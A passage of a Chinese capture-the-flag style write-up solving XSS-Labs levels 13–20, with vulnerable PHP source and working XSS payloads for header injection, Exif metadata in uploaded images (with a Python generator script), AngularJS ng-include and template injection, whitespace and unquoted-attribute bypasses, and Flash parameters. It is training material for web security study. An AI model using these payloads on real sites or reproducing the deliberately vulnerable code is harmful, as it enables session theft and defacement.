echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>

```

1.和上两关没什么区别，这次变成了 `cookie`

2.源码中如下写到，使用了cookie中user的值，在看不到源码情况下，通过bp抓包也是能明显发现端倪的

```php
setcookie("user", "call me maybe?", time()+3600);
```

```
Cookie: user=call+me+maybe%3F  
```

题目中暗示我们修改user的值进而实现注入

3.剩下的就和上述关卡没什么区别了

```
Cookie: user=" onclick = alert(1) type="text
```

### HTTP请求头注入

| **关卡**       | **注入点 (HTTP Header)** | **PHP 接收代码 (漏洞源)**            | **过滤情况**                    | **核心 Payload (通用)**             |
| ------------ | --------------------- | ----------------------------- | --------------------------- | ------------------------------- |
| **Level 11** | **Referer**           | `$_SERVER['HTTP_REFERER']`    | 过滤 `<` `>` <br> **不过滤 `"`** | `" onclick=alert(1) type="text` |
| **Level 12** | **User-Agent**        | `$_SERVER['HTTP_USER_AGENT']` | 过滤 `<` `>` <br> **不过滤 `"`** | `" onclick=alert(1) type="text` |
| **Level 13** | **Cookie**            | `$_COOKIE['user']`            | 过滤 `<` `>` <br> **不过滤 `"`** | `" onclick=alert(1) type="text` |



## 第十四关

源码呈现

```html
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center><iframe name="leftframe" marginwidth=10 marginheight=10 src="http://www.exifviewer.org/" frameborder=no width="80%" scrolling="no" height=80%></iframe></center><center>这关成功后不会自动跳转。成功者<a href=/xss/level15.php?src=1.gif>点我进level15</a></center>
</body>
</html>

```

1.XSS Labs 的第 14 关经常被认为是“坏掉的”或者“无法完成的”

2.这里我们可以通过本地修改，实现本地运行,我这里是docker环境，就直接进去修改了`level14.php`

```php
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>欢迎来到level14</title>
</head>
<body>
<h1 align=center>欢迎来到level14</h1>
<center>
    <h3>题目说明：此关卡考查 Exif XSS。</h3>
    <p>原题依赖的外部网站已挂，此处模拟了后端读取 Exif 的逻辑。</p>

    <form action="" method="post" enctype="multipart/form-data">
        <label>选择包含恶意 Exif 信息的图片：</label>
        <input type="file" name="file" />
        <input type="submit" value="上传并分析" />
    </form>
</center>

<?php
// 关闭错误显示，避免干扰
ini_set("display_errors", 0);

// 如果有文件上传
if(isset($_FILES["file"])) {
    // 简单的类型检查
    if ((($_FILES["file"]["type"] == "image/jpeg") || ($_FILES["file"]["type"] == "image/pjpeg"))) {

        $filename = $_FILES["file"]["tmp_name"];

        // 【核心考点还原】
        // 使用 exif_read_data 读取元数据
        // 原题的漏洞在于：读取了 Exif 中的 Model (相机型号) 等字段后，未过滤直接 echo
        $exif = @exif_read_data($filename);

        echo "<center><br><h3>图片分析结果：</h3>";

        if($exif && isset($exif['Model'])) {
            // 漏洞点在这里：直接拼接输出，造成 XSS
            echo "相机型号: " . $exif['Model']; 
        } else {
            echo "未读取到相机型号信息 (Model)，请确保图片带有 Exif 数据。";
        }
        echo "</center>";
    }
}
?>

<center>
    <br><br>
    <div>(成功弹窗后，点击下方链接进入下一关)</div>
    <a href="level15.php">点我进level15</a>
</center>
</body>
</html>
```

图方便，这里也没有再写其他的过滤什么的了，自己想的话也可以，最终方法也和之前的关卡大差不差

3.然后我们不妨构造`python` 脚本来实现

```python
import piexif
from PIL import Image

# 1. 设置 Payload
# 我们要在网页里执行 alert(1)，所以写入 <script>alert(1)</script>
# 注意：写入的位置是 Exif 中的 "Model" (相机型号) 字段
payload = '<script>alert("Level 14 Cracked")</script>'

# 2. 读取原始图片
img_filename = "a.jpg"  # 随便找张jpg图放在同级目录
output_filename = "hack.jpg"

try:
    img = Image.open(img_filename)

    # 3. 构造 Exif 数据
    # Tag 272 对应 Model 属性
    exif_dict = {"0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": None}
    exif_dict["0th"][piexif.ImageIFD.Model] = payload.encode('utf-8')

    # 4. 生成字节流并保存
    exif_bytes = piexif.dump(exif_dict)
    img.save(output_filename, exif=exif_bytes)
    print(f"[+] 生成成功: {output_filename}")
    print("[+] Payload 已写入相机型号字段")

except Exception as e:
    print(f"[-] 出错了: {e}")
```

### Exif 注入

1. 核心概念
* **Exif 是什么**：图片的“隐藏备注信息”（元数据），包含相机型号、拍摄时间、GPS等。存放在 JPG 文件头部。

* **注入原理**：Exif 本质是文本。攻击者使用工具将“相机型号”等字段修改为 **恶意代码**（如 XSS Payload）。

* **触发条件**：服务器端读取了图片 Exif 信息（如 `exif_read_data()`），并且**没有过滤**就直接显示在页面上或存入数据库。
2. 攻击流程

3. **制作**：用 ExifTool 或 Python 脚本，将 Payload 写入图片字段。

4. **上传**：将“带毒”图片上传至目标网站。

5. **执行**：
   
   * **Stored XSS**：当用户/管理员查看图片详情页时触发。
   
   * **SQL 注入**：当后端将 Exif 信息存入数据库时触发（较少见）。

| **注入字段 (Tag Name)**  | **含义** | **推荐指数** | **原因**               |
| -------------------- | ------ | -------- | -------------------- |
| **Model**            | 相机型号   | ⭐⭐⭐⭐⭐    | 最常被读取和显示，Level 14 考点 |
| **Make**             | 相机制造商  | ⭐⭐⭐⭐⭐    | 常与 Model 一起被显示       |
| **ImageDescription** | 图像描述   | ⭐⭐⭐⭐     | 允许字符较长，适合长 Payload   |
| **UserComment**      | 用户注释   | ⭐⭐⭐⭐     | 专门留给用户写的，容量大         |
| **Artist**           | 摄影师/作者 | ⭐⭐⭐      | 有些相册程序会显示作者名         |
| **Copyright**        | 版权信息   | ⭐⭐⭐      | 通常显示在页面底部            |

## 第十五关

源码呈现

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<?php 
ini_set("display_errors", 0);
$str = $_GET["src"];
echo '<body><span class="ng-include:'.htmlspecialchars($str).'"></span></body>';
?>

```

1.这关的核心技术是 **AngularJS** 的前端包含漏洞。

当然直接看网页源码也能看得出来

```php
<html ng-app>
<head>
        <meta charset="utf-8">
        <script src="angular.min.js"></script>
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level16.php?keyword=test"; 
}
</script>
<title>欢迎来到level15</title>
</head>
<h1 align=center>欢迎来到第15关，自己想个办法走出去吧！</h1>
<p align=center><img src=level15.png></p>
<body><span class="ng-include:"></span></body>
```

2.**`ng-include` 是什么？** 这是 AngularJS 的一个指令（Directive）。它的作用类似于 PHP 的 `include`，用来**把外部的一个 HTML 文件抓取过来，并放到当前标签里显示**。**原本的设计意图**：这关原本是接着 Level 14 的。作者想让你在 Level 14 上传一个含有 Payload 的图片（比如 `1.jpg`），然后在 Level 15 里引用它 (`?src='1.jpg'`)。AngularJS 会把图片当成 HTML 代码执行。但是很遗憾14关坏掉了。

3.但是我们可以换个思路 从第一关入手，我们可以如下构造

```html
level15.php?src='level1.php?name=<img src=1 onerror=alert(1)>'
```

为什么不用 `<script>`？因为 AngularJS 通过 `ng-include` 加载进来的 HTML，如果不做特殊处理，直接的 `<script>` 标签往往不会执行，但 `<img>` 标签的 `onerror` 事件是肯定会触发的

之所以这里经过了`htmlspecialchars()`还能够正常使用，通过`ng-include ` 因为浏览器会自动处理实体编码 `&lt;` 还原为字符给 JS 使用，或者作为 URL 参数发送

### AngularJS

| **知识点**        | **关键指令/符号**                  | **作用 (正常功能)**                  | **CTF/安全考点 (黑客视角)**                                  | **典型 Payload / 场景**                               |
| -------------- | ---------------------------- | ------------------------------ | ---------------------------------------------------- | ------------------------------------------------- |
| **启动指令**       | `ng-app`                     | 定义 Angular 应用的根元素，告诉框架从这里开始解析。 | 如果页面没开 Angular，你可以注入这个属性强制开启，从而进行后续攻击。               | `<html ng-app>`                                   |
| **文件包含**       | `ng-include`                 | 加载外部 HTML 片段并编译执行。             | **绕过本地过滤**。将 XSS Payload 藏在另一个文件或 URL 中，利用此指令“借刀杀人”。 | `<div ng-include="'level1.php?x=payload'"></div>` |
| **模板表达式**      | `{{ }}`                      | 在 HTML 中输出变量或简单的计算结果。          | **CSTI (模板注入)**。利用特殊的构造绕过沙箱，执行任意 JS 代码。              | `{{constructor.constructor('alert(1)')()}}`       |
| **事件指令**       | `ng-click`<br>`ng-mouseover` | 绑定鼠标点击、悬停等事件。                  | 类似于原生的 `onclick`，但属于 Angular 体系，有时能绕过对标准 HTML 事件的过滤。 | `<div ng-mouseover="x=1">`                        |
| **不安全 HTML**   | `ng-bind-html`               | 将 HTML 内容绑定到元素上。               | 如果没有配合 `$sce` (严格上下文转义) 使用，会导致 DOM 型 XSS。            | `<div ng-bind-html="user_input">`                 |
| **过滤器**        | `\|`                         | `\|` (管道符)                     | 格式化数据（如大小写转换、排序）。                                    | 有时用来混淆 Payload，或者在老版本中利用 `orderBy` 等过滤器进行沙箱逃逸。    |
| **No-Execute** | `ng-non-bindable`            | 告诉 Angular **不要**解析该元素的内容。     | **防御手段**。如果你看到这个，说明你的注入在这块区域会失效。                     | `<span ng-non-bindable>{{1+1}}</span>`            |

## 第十六关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level17.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level16</title>
</head>
<body>
<h1 align=center>欢迎来到level16</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script"," ",$str);
$str3=str_replace(" "," ",$str2);
$str4=str_replace("/"," ",$str3);
$str5=str_replace("    "," ",$str4);
echo "<center>".$str5."</center>";
?>
<center><img src=level16.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str5)."</h3>";
?>
</body>
</html>


```

1.从源码分析可以得到 这一关无法使用大小写绕过，无法使用`script` 甚至于` `（空格）都被转译成了 `&nbsp`

```php
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script"," ",$str);
$str3=str_replace(" "," ",$str2);
$str4=str_replace("/"," ",$str3);
$str5=str_replace("    "," ",$str4);
```

既然不让使用`<script>` 那么不妨使用 `<img>`、`<svg>`、`<body>` 等等，但是这中间的空格怎么办呢。

2.解析 HTML 的时候特别宽容。除了**空格（Space, %20）**，它还认其他的“空白字符”作为分隔符。被封了空格，被封了 Tab还有

* **回车符（CR, Carriage Return）** -> URL 编码是 `%0d`

* **换行符（LF, Line Feed）** -> URL 编码是 `%0a`

所以，我们的思路就是：**用 `%0a` 或者 `%0d` 代替空格，把标签属性隔开。**

3.那么我们就可以构造最经典的`<img>`

```html
keyword=<img%0asrc=x%0aonerror=alert(1)>
```

或者还可以使用[标签逃逸](#标签逃逸) 中的其他办法

### 空格绕过全家桶

| **字符大名**       | **URL编码** | **在 Level 16 的下场** | **实战地位**     | **原理解析**                                                   |
| -------------- | --------- | ------------------ | ------------ | ---------------------------------------------------------- |
| **空格 (Space)** | `%20`     | **被干死了**           | 炮灰           | 最标准的空格。正因为太标准，所有 WAF 第一刀砍的绝对是它。这题直接 `str_replace` 换成空，没法用。 |
| **制表符 (Tab)**  | `%09`     | **被干死了**           | 替补           | 也就是键盘上的 Tab 键。很多懒狗开发只过滤 `%20` 忘了 `%09`，但这题作者把这也堵上了。        |
| **换行符 (LF)**   | `%0a`     | **✅ 存活 (MVP)**     | **隐形刺客**     | Linux 系统的换行。浏览器把它当空格认，但 PHP 代码里没过滤它。**这就是本题解法**。           |
| **回车符 (CR)**   | `%0d`     | **✅ 存活 (MVP)**     | **备胎**       | Windows 系统的回车前一半。跟 `%0a` 是一路货色，这题也能用它过。                    |
| **斜杠 (Slash)** | `/`       | **被干死了**           | **God Like** | 神技。`<img/src=x>` 这种写法完全不需要任何空白符。可惜这题防住了，不然这才是最骚的。          |
| **换页符 (FF)**   | `%0c`     | 看运气                | 神经病          | 极冷门字符。有的老旧浏览器或者特定环境才认。实在没办法了可以拿出来碰碰运气。                     |
| **垂直制表符**      | `%0b`     | 看运气                | 神经病二号        | 同上，属于死马当活马医的选项。                                            |

## 第十七关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！"); 
}
</script>
<title>欢迎来到level17</title>
</head>
<body>
<h1 align=center>欢迎来到level17</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
</body>
</html>
```

1.它考的不是 Flash 漏洞，而是**HTML 解析的一个经典逻辑**，所以flash坏了也没事

2.核心代码

```php
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
```

坏消息，经过过滤了，好多都不能使用了，好消息，`src=xsf01.swf?...`。 **没有引号！没有引号！没有引号！**

在 HTML 语法里，如果一个属性的值没有用引号包裹，浏览器怎么知道这个属性值在哪里结束？ **答案是：遇到空格就结束。**

3.那么我们就可以利用`arg02` 来构造

```
level17.php?arg01=a&arg02=b%20onmouseover=alert(1)
```

我们让 `arg01` 随便填个 `a`。我们在 `arg02` 里填：`b onmouseover=alert(1)`

## 第十八关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level19.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level18</title>
</head>
<body>
<h1 align=center>欢迎来到level18</h1>
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
</body>
</html>

```

1.和十七没有任何区别，payload同第十七

```
level18.php?arg01=a&arg02=b%20onmouseover=alert(1)
```

## 第十九关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level20.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level19</title>
</head>
<body>
<h1 align=center>欢迎来到level19</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>


```

1.这一关把上面最大的问题给修复了 `"` 

这一关的注入就需要使用flash了 但是现代浏览器无法使用flash怎么办 

这里可以用 `Ruffle` 这个浏览器插件，非常简单（但是有时候可能bug修的太好了导致flash的漏洞它用不了）

或者去找一个专门的`尸体浏览器`

2.想要解析`xsf03.swf` 我们就必须用到 另一个工具 `JPEXS` `sIFR`文件太长了就不展示了(这里就意思意思了，flash逆向没学明白)

这个 `xsf03.swf` 是个老演员了。它的 ActionScript 逻辑大概是这样的：

1. 它接收一个名为 `version` 的参数。

2. 它把这个参数直接赋值给了一个文本框的 `htmlText` 属性。

3. Flash 的 `htmlText` 支持有限的 HTML 标签，其中就包括 `<a>` 标签（超链接）。

这就好办了，我们只要构造一个带 `javascript:` 伪协议的 `<a>` 标签，传给 `version` 参数，然后在 Flash 里点一下生成的链接，就能触发 JS。

3.我们就可以如下构造出

```
level19.php?arg01=version&arg02=<a href="javascript:alert(1)">快点我拿flag</a>
```

这里利用了浏览器在渲染 HTML 标签时，有一个规则：**在解析 HTML 属性值（比如 src、href、value）时，会自动进行“HTML 实体解码”。** 使用就算转义了也没事。

## 第二十关

源码呈现

```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level21.php?arg01=a&arg02=b"; 
}
</script>
<title>欢迎来到level20</title>
</head>
<body>
<h1 align=center>欢迎来到level20</h1>
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
</body>
</html>


```

1.这个 `xsf04.swf` 是一个名为 **ZeroClipboard** 的组件（早期版本）。它的功能是帮助网页实现“复制到剪贴板”的功能。它内部使用 `ExternalInterface.call` 来调用浏览器的 JavaScript 函数。其 ActionScript 逻辑大致如下（简化版）：

```php
// 获取传入的 id 参数
var id = loaderInfo.parameters.id;
// 调用 JS，构造类似于这样的代码：
ExternalInterface.call("ZeroClipboard.dispatch", id, "mouseOut", null);
```

或者在生成的 JS 中，它会被拼接到一个字符串里： `try { __flash__toXML(ZeroClipboard.dispatch("你的ID")); } catch (e) { ... }`

**漏洞点：** Flash 在拼接这段 JS 代码时，没有正确处理我们传入的 `id` 参数。如果我们传入特定的字符，就能闭合掉原本的引号和括号，插入我们自己的 JS 代码。

3.我们需要做两件事：

1. **参数名 (`arg01`)**：必须是 Flash 预定义的参数名，这里是 `id`。

2. **参数值 (`arg02`)**：需要闭合 Flash 构造的 JS 语句。

**构造 Payload：** 通常这关的标准 Payload 是 `\"))alert(1)//`。

* `\"`：这里的反斜杠通常是为了转义 Flash 内部可能存在的转义，或者配合双引号闭合字符串。

* `))`：闭合前面的函数调用括号。

* `alert(1)`：执行我们的代码。

* `//`：注释掉后面原本的 JS 代码，防止语法错误。

```php
level20.php?arg01=id&arg02=\"))alert(1)//
```

遗憾的是不知道为什么我就是触发不了，下面附上大佬的解析

> [XSS LABS - Level 20 过关思路_xss-lab20-CSDN博客](https://blog.csdn.net/m0_73360524/article/details/141619635)
